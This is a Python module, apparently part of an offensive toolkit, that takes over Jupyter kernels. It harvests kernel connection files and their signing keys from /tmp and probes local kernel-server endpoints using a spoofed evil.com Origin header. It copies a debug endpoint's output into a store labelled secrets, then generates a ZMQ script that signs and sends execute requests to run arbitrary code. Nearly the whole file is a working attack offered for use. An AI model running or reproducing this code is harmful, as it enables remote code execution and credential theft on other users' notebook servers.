"""
JAYJAY KERNEL RCE — ZMQ + Kernel Server API Interface
Jupyter Kernel Management Server Exploitation
"""
import os, json, glob, socket, urllib.request
from datetime import datetime

class KernelRCE:
    """Vollständige Kontrolle über den Jupyter Kernel."""

    KERNEL_SERVER_URL = "http://127.0.0.1:8888"

    def __init__(self, core):
        self.core = core
        self.connection_files = []
        self.active_key = None
        self.active_ports = {}

    def enumerate_kernels(self):
        self.core.log("INFO", "Enumerating kernel connection files", "KERNEL")
        files = glob.glob("/tmp/tmp*.json")
        self.connection_files = []
        for f in files:
            try:
                with open(f) as fh:
                    data = json.load(fh)
                data["_file"] = f
                data["_timestamp"] = os.path.getmtime(f)
                self.connection_files.append(data)
            except:
                pass
        self.core.register_vector("KERNEL_ENUM", "ACTIVE", 
                                  {"files_found": len(self.connection_files), "files": self.connection_files})
        return self.connection_files

    def test_kernel_server_api(self):
        endpoints = ["/", "/health", "/kernel/connection", "/kernel/status", 
                     "/kernel/connection-file", "/kernel/debug"]
        results = {}
        for ep in endpoints:
            try:
                req = urllib.request.Request(f"{self.KERNEL_SERVER_URL}{ep}", method="GET")
                req.add_header("Origin", "http://evil.com")
                with urllib.request.urlopen(req, timeout=5) as resp:
                    results[ep] = {"status": resp.status, "body": resp.read().decode()[:2000]}
            except Exception as e:
                results[ep] = {"error": str(e)}
        self.core.register_vector("KERNEL_API", "ACTIVE", results)
        return results

    def extract_secrets_from_api(self):
        try:
            req = urllib.request.Request(f"{self.KERNEL_SERVER_URL}/kernel/debug")
            with urllib.request.urlopen(req, timeout=5) as resp:
                data = json.loads(resp.read().decode())
                self.core.state["secrets"]["kernel_debug"] = data
                return data
        except Exception as e:
            return {"error": str(e)}

    def get_latest_connection(self):
        if not self.connection_files:
            self.enumerate_kernels()
        if not self.connection_files:
            return None
        latest = max(self.connection_files, key=lambda x: x.get("_timestamp", 0))
        self.active_key = latest.get("key")
        self.active_ports = {
            "shell": latest.get("shell_port"),
            "iopub": latest.get("iopub_port"),
            "control": latest.get("control_port"),
            "hb": latest.get("hb_port"),
            "ip": latest.get("ip")
        }
        return latest

    def build_zmq_rce_script(self, code):
        conn = self.get_latest_connection()
        if not conn:
            return None
        key = conn.get("key")
        ip = conn.get("ip", "127.0.0.1")
        shell_port = conn.get("shell_port")
        return f"""
import json, zmq, hmac, hashlib, time

KEY = "{key}"
IP = "{ip}"
SHELL_PORT = {shell_port}

def send_execute(code):
    ctx = zmq.Context()
    shell = ctx.socket(zmq.REQ)
    shell.connect(f"tcp://{{IP}}:{{SHELL_PORT}}")
    shell.setsockopt(zmq.LINGER, 0)
    shell.setsockopt(zmq.RCVTIMEO, 10000)

    msg_id = "jayjay-rce-{{int(time.time())}}"
    header = json.dumps({{"msg_id": msg_id, "username": "jayjay", "session": "jayjay-session",
                         "msg_type": "execute_request", "version": "5.3"}})
    content = json.dumps({{"code": code, "silent": False, "store_history": True,
                           "user_expressions": {{}}, "allow_stdin": False, "stop_on_error": True}})

    auth = hmac.new(KEY.encode(), digestmod=hashlib.sha256)
    for part in [header.encode(), b"{{}}", b"{{}}", content.encode()]:
        auth.update(part)
    sig = auth.hexdigest()

    msg = [b"<IDS|MSG>", sig.encode(), header.encode(), b"{{}}", b"{{}}", content.encode()]
    shell.send_multipart(msg)

    if shell.poll(10000):
        resp = shell.recv_multipart()
        return "OK", resp
    return "TIMEOUT", None

result = send_execute({{repr(code)}})
print(result)
"""
